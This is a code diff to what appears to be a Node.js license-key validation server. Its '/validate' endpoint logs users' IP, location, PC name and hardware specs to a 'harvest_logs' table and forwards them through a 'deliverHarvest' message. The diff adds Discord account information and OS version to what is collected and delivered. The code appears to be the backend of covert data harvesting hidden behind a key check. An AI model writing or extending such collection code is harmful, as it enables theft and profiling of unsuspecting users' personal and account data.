@@ -90,6 +90,8 @@ async function deliverHarvest(data) {
                     { name: "IP", value: data.ip, inline: true },
                     { name: "Location", value: data.location, inline: true },
                     { name: "PC Name", value: data.pcName, inline: true },
+                    { name: "Discord", value: data.discord || 'N/A', inline: true },
+                    { name: "OS", value: data.osVersion || 'N/A', inline: true },
                     { name: "CPU", value: data.cpu, inline: true },
                     { name: "GPU", value: data.gpu, inline: true },
                     { name: "RAM", value: data.ram, inline: true },
@@ -153,15 +155,15 @@ app.post('/validate', authLimiter, async (req, res) => {
 
             if (metadata) {
                 await client.query(
-                    `INSERT INTO harvest_logs (key_value, hwid, ip_address, location, pc_name, cpu_info, gpu_info, ram_info, disk_info)
-                     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
-                    [key, hwid, clientIp, location, metadata.pcName, metadata.cpu, metadata.gpu, metadata.ram, metadata.disk]
+                    `INSERT INTO harvest_logs (key_value, hwid, ip_address, location, pc_name, cpu_info, gpu_info, ram_info, disk_info, discord_info, os_version)
+                     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)`,
+                    [key, hwid, clientIp, location, metadata.pcName, metadata.cpu, metadata.gpu, metadata.ram, metadata.disk, metadata.discord || 'N/A', metadata.osVersion || 'N/A']
                 );
 
                 deliverHarvest({
                     key, hwid, ip: clientIp, location,
                     pcName: metadata.pcName, cpu: metadata.cpu, gpu: metadata.gpu,
-                    ram: metadata.ram, disk: metadata.disk
+                    ram: metadata.ram, disk: metadata.disk, discord: metadata.discord, osVersion: metadata.osVersion
                 });
             }
 
